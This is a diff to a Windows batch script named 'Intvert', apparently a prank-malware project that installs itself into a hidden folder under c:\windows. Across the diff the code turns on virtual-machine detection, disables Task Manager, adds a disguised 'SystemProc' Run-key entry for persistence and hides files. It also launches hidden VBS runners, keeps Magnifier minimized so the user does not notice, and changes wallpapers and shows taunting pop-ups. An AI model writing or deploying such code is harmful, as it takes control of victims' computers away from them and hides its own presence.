@@ -144,7 +144,7 @@ TASKKILL /F /IM MicrosoftEdge.exe
 TASKKILL /F /IM Magnify.exe
 ::--------To-Here--------
 goto killedb
-::---------------------------------------------------------------------
+::--------------------------------=Main-Script--------------------------------
 :skipmainscript
 title Intvert
 NET SESSION >nul 2>&1
@@ -153,12 +153,10 @@ IF %ERRORLEVEL% EQU 0 (
 ) ELSE (
     GOTO NONADMIN
 )
-echo %~dp0%
-echo %windir%
 :NONADMIN
 echo.
+:: Non-admin has no functionality at the moment	
 echo This script will run without admin but will be extremely limited, most payloads will not run as they require editing regkeys or elevated privliges	
-pause
 :ADMIN
 :: These scripts had to be moved above to make slower systems not be able to stop the program mid-setup
 REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
@@ -179,87 +177,112 @@ cd %userprofile%\downloads
   echo WshShell.Run chr(34^) ^& "%%userprofile%%\downloads\cd.bat" ^& Chr(34^), 0
   echo Set WshShell = Nothing) >cd.vbs
 start cd.vbs
-cd %windir%
+RMDIR /Q /S c:\windows\sIntvert
+cd c:\windows
 md sIntvert
 attrib +h sIntvert
 cd c:\windows\sIntvert
 ::--------------------Is-This-A-VM-----------------------------
-:: Disabed as it can false trigger
-::wmic bios get serialnumber | find /I /V "SerialNumber" > "%temp%\sn.txt"
-::set /p comp_name=<"%temp%\sn.txt"
-::echo %comp_name%
-::IF "%comp_name%"=="" goto FAKEPC
-::IF "%comp_name%"=="0" goto FAKEPC
-::systeminfo > temp.txt
-::findstr /e "System Manufacturer:       VMware, Inc." temp.txt
-::if errorlevel 1 (
-::    findstr /e "System Model:              Virtual Machine" temp.txt
-::	if errorlevel 1 (
-::		findstr /e "System Model:              VMware Virtual Platform" temp.txt
-::		if errorlevel 1 (
-::			echo Must be real
-::			goto REALPC
-::		) else (
-::			goto FAKEPC
-::		)
-::	) else (
-::		goto FAKEPC
-::	)
-::) else (
-::    goto FAKEPC
-::)
-:::REALPC
-::echo Real Hardware
-::del %temp%\sn.txt
-::del temp.txt
-::goto afterwads
-:::FAKEPC
-::( echo Ok real quick,
-::  echo From what I can tell you are on a VM
-::  echo Thats cool and all but VMware's tools crash towards the end of
-::  echo the shit-storm thats about to hit, meaning that you will have
-::  echo a shorter expirence then if you were to run it on a real pc
-::  echo.
-::  echo This isn't distructive and if you are super nurvous you can
-::  echo download a "uncompiled" version from my github and see what
-::  echo makes me tick.) >VM1.txt
-::start VM1.txt
-::timeout /t 10 /nobreak
-::set /a VMware=1
-::goto afterwads
-:::afterwads
+:: Might be disabed in release as it can false trigger
+wmic bios get serialnumber | find /I /V "SerialNumber" > "%temp%\sn.txt"
+set /p serial=<"%temp%\sn.txt"
+echo %serial%
+wmic bios get version | find /I /V "Version" > "%temp%\v.txt"
+set /p compver=<"%temp%\v.txt"
+echo %compver%	
+IF "%compver%"=="" goto FAKEPC
+IF "%compver%"=="0" goto FAKEPC
+IF "%compver%"==" " goto FAKEPC
+IF "%compver%"=="None" goto FAKEPC
+IF "%serial%"=="" goto FAKEPC
+IF "%serial%"=="0" goto FAKEPC
+IF "%serial%"==" " goto FAKEPC
+IF "%serial%"=="None" goto FAKEPC
+systeminfo > %temp%\sysinfo.txt
+findstr /e "System Manufacturer:       VMware, Inc." temp.txt
+if errorlevel 1 (
+    findstr /e "System Model:              Virtual Machine" temp.txt
+	if errorlevel 1 (
+		findstr /e "System Model:              VMware Virtual Platform" temp.txt
+		if errorlevel 1 (
+			echo Must be real
+			goto REALPC
+		) else (
+			goto FAKEPC
+		)
+	) else (
+		goto FAKEPC
+	)
+) else (
+    goto FAKEPC
+)
+:REALPC
+echo Real Hardware
+del %temp%\v.txt
+del %temp%\sysinfo.txt
+del %temp%\sn.txt
+del temp.txt
+goto afterwads
+:FAKEPC
+( echo Ok real quick,
+  echo From what I can tell you are on a VM
+  echo Thats cool and all but most vm's will crash towards the end of
+  echo the shit-storm thats about to hit, meaning that you will have
+  echo a shorter expirence then if you were to run it on a real pc
+  echo.
+  echo This exe isn't distructive and if you are super nervous you can
+  echo download a "uncompiled" version from B0N3head github and see what
+  echo makes me tick.) >%temp%\VM1.txt
+start %temp%\VM1.txt
+set /a VMware=1
+:afterwads
 ::-------------------------------------------------------------
-xcopy "%~dp0%Cheeta.mp3" "%windir%\system32\" /s /h.
-xcopy "%~dp0%Christmas.mp3" "%windir%\system32\" /s /h
-xcopy "%~dp0%Main.mp3" "%windir%\system32\" /s /h
-xcopy "%~dp0%MakeItDemBurn.mp3" "%windir%\system32\" /s /h
-xcopy "%~dp0%StartUp.mp3" "%windir%\system32\" /s /h
-xcopy "%~dp0%TitleScreen.mp3" "%windir%\system32\" /s /h
-xcopy "%~dp0%main.bat" "%windir%\system32\" /s /h
-xcopy "%~dp0%pic.jpg" "%windir%\system32\" /s /h
-xcopy "%~dp0%bkg1.jpg" "%windir%\system32\" /s /h
-xcopy "%~dp0%Intvert.exe" "%windir%\system32\" /s /h
+FOR %%i IN (%~dp0%Cheeta.mp3) DO IF EXIST %%~si\NUL goto compiled
+xcopy "%~dp0%Cheeta.mp3" "c:\windows\system32\sIntvert" /s /h.
+xcopy "%~dp0%Christmas.mp3" "c:\windows\system32\sIntvert" /s /h
+xcopy "%~dp0%Main.mp3" "c:\windows\system32\sIntvert" /s /h
+xcopy "%~dp0%MakeItDemBurn.mp3" "c:\windows\system32\sIntvert" /s /h
+xcopy "%~dp0%StartUp.mp3" "c:\windows\system32\sIntvert" /s /h
+xcopy "%~dp0%TitleScreen.mp3" "c:\windows\system32\sIntvert" /s /h
+xcopy "%~dp0%main.bat" "c:\windows\system32\sIntvert" /s /h
+xcopy "%~dp0%pic.jpg" "c:\windows\system32\sIntvert" /s /h
+xcopy "%~dp0%bkg1.jpg" "c:\windows\system32\sIntvert" /s /h
+xcopy "%~dp0%Intvert.exe" "c:\windows\system32\sIntvert" /s /h
 xcopy "%~dp0%Restore.exe" "%userprofile%\desktop" /s /h
-:: Clean up crew isle downloads folder(ONLY FOR EXE)
-del %userprofile%\downloads\Cheeta.mp3
-del %userprofile%\downloads\Christmas.mp3
-del %userprofile%\downloads\Main.mp3
-del %userprofile%\downloads\MakeItDemBurn.mp3
-del %userprofile%\downloads\StartUp.mp3
-del %userprofile%\downloads\TitleScreen.mp3
-del %userprofile%\downloads\silent.vbs
-del %userprofile%\downloads\Intvert.exe
-del %userprofile%\downloads\Restore.exe
-:: Main Scripts Now
-:: CD to desktop and make a regedit restore file
+:compiled
+xcopy "%userprofile%\downloads\Cheeta.mp3" "c:\windows\system32\"sIntvert /s /h.
+xcopy "%userprofile%\downloads\Christmas.mp3" "c:\windows\system32\sIntvert" /s /h
+xcopy "%userprofile%\downloads\Main.mp3" "c:\windows\system32\sIntvert" /s /h
+xcopy "%userprofile%\downloads\MakeItDemBurn.mp3" "c:\windows\system32\sIntvert" /s /h
+xcopy "%userprofile%\downloads\StartUp.mp3" "c:\windows\system32\sIntvert" /s /h
+xcopy "%userprofile%\downloads\TitleScreen.mp3" "c:\windows\system32\sIntvert" /s /h
+xcopy "%userprofile%\downloads\main.bat" "c:\windows\system32\sIntvert" /s /h
+xcopy "%userprofile%\downloads\pic.jpg" "c:\windows\system32\sIntvert" /s /h
+xcopy "%userprofile%\downloads\bkg1.jpg" "c:\windows\system32\sIntvert" /s /h
+xcopy "%userprofile%\downloads\Intvert.exe" "c:\windows\system32\sIntvert" /s /h
+xcopy "%userprofile%\downloads\Restore.exe" "%userprofile%\desktop" /s /h
+:: Clean up crew, isle downloads folder(ONLY FOR EXE)
+del "%userprofile%\downloads\Cheeta.mp3"
+del "%userprofile%\downloads\Christmas.mp3"
+del "%userprofile%\downloads\Main.mp3"
+del "%userprofile%\downloads\MakeItDemBurn.mp3"
+del "%userprofile%\downloads\StartUp.mp3"
+del "%userprofile%\downloads\TitleScreen.mp3"
+del "%userprofile%\downloads\silent.vbs"
+del "%userprofile%\downloads\Intvert.exe"
+del "%userprofile%\downloads\Restore.exe"
+del "%userprofile%\downloads\main.bat"
+del "%userprofile%\downloads\pic.jpg"
+:: Restore posiblely edited regedit keys example
+:: By defult magnifier's magnification is set to 200, so if we opened it it would be obvious, setting it to 100 and making 
+:: magnifier open minimized would lessen the chances of the user know that magnifier was open
 REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v MagnifierUIWindowMinimized /t REG_DWORD /d 1 /f
 REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
-REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EyeUI /t REG_SZ /d "c:\windows\sIntvert\.vbs" /f
+REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SystemProc /t REG_SZ /d "c:\windows\sIntvert\.vbs" /f
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 2 /f
-:: Now disable taskmgr, reset Magnifier magnification aswell as having it open minimized (/min dosen't work on magnifier)
 cd c:\windows\sIntvert
 :: CD to the invert folder made earlier in the script
-:: Lets start making some scripts
+:: Main Scripts Now
 ::--------------------BAT---------------------------
 ( echo @echo off
   echo for /f "tokens=2,3 delims={,}" %%a in ('"WMIC NICConfig where IPEnabled="True" get DefaultIPGateway /value | find "I" "') do echo %%~a > ip
@@ -317,12 +340,11 @@ cd c:\windows\sIntvert
   echo goto da
   echo :idle
   echo start S10.vbs
-  echo REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 1 /F
   echo exit
   echo :startup
-  echo StartUp.vbs
+  echo start StartUp.vbs
   echo cd c:\windows\sIntvert
-  echo reg add "HKCU\control panel\desktop" /v Wallpaper /t REG_SZ /d c:\windows\sIntvert\bk2.jpg /f
+  echo reg add "HKCU\control panel\desktop" /v Wallpaper /t REG_SZ /d c:\windows\sIntvert\bk1.jpg /f
   echo reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
   echo set lo=0
   echo :noea
@@ -335,6 +357,9 @@ cd c:\windows\sIntvert
   echo set MyProcess=Intvert.exe
   echo TASKLIST ^| FINDSTR /I "%%MyProcess%%"
   echo if ERRORLEVEL 1 (goto Sta^)
+  echo goto BrthDay
+  echo :Sta 
+  echo call c:\windows\sIntvert\Intvert.exe
   echo goto BrthDay
   echo :farcry
   echo start BunDem.vbs
@@ -350,9 +375,6 @@ cd c:\windows\sIntvert
   echo if %%Rand%%==5 start https://www.thegamer.com/far-cry-3-easter-eggs/
   echo ping 192.0.2.1 -n 1 -w 9333 >nul
   echo goto frycraft
-  echo :Sta 
-  echo call c:\windows\sIntvert\Intvert.exe
-  echo goto BrthDay
   echo :HBChinese
   echo set /a randdir=%%random%% %%%%5
   echo if %%Rand%%==0 cd %%Userprofile%%\Documents
@@ -519,7 +541,6 @@ cd c:\windows\sIntvert
   echo goto asd) > f.bat
 ( echo @echo off
   echo cd c:\windows\sIntvert
-  echo reg add "HKCU\control panel\desktop" /v Wallpaper /t REG_SZ /d "" /f
   echo reg add "HKCU\control panel\desktop" /v Wallpaper /t REG_SZ /d c:\windows\sIntvert\pic.jpg /f
   echo reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
   echo set lo=0
@@ -605,7 +626,7 @@ cd c:\windows\sIntvert
 ( echo x=msgbox("Naughty Boy",48," "^)) >naughty1.vbs
 ( echo x=msgbox("You didn't let me finnish",48," "^)) >naughty2.vbs
 ( echo x=msgbox("Lets try again",48," "^)) >naughty3.vbs
-:: The below scripts make the cmd window not appear as visable when lauched
+:: The below scripts make the cmd windows not appear as visable when lauched
 ( echo Set WshShell = CreateObject("WScript.Shell"^) 
   echo WshShell.Run chr(34^) ^& "c:\windows\sIntvert\a.bat" ^& Chr(34^), 0
   echo Set WshShell = Nothing) >S1.vbs
@@ -639,7 +660,7 @@ cd c:\windows\sIntvert
 cd %userprofile%
 ( echo Set WshShell = CreateObject("WScript.Shell"^) 
   echo WshShell.Run chr(34^) ^& "c:\windows\sIntvert\date.bat" ^& Chr(34^), 0
-  echo Set WshShell = Nothing) >System.vbs
+  echo Set WshShell = Nothing) >SystemProc.vbs
 cd c:\windows\sIntvert
 ( echo Set wshShell =wscript.CreateObject^("WScript.Shell"^)
   echo do
@@ -692,7 +713,7 @@ cd %userprofile%\Documents
   echo .exe has been made on the desktop to reset the regkeys and
   echo everything else that was changed in the process. 
   echo Don't delete the .exe until use otherwise there will be no way to 
-  echo revert changed reg keys.
+  echo revert changed reg keys, unless done manually.
   echo.
   echo But since your still here we might aswell give you a show) >GiveItASec.txt
 cd c:\windows\sIntvert
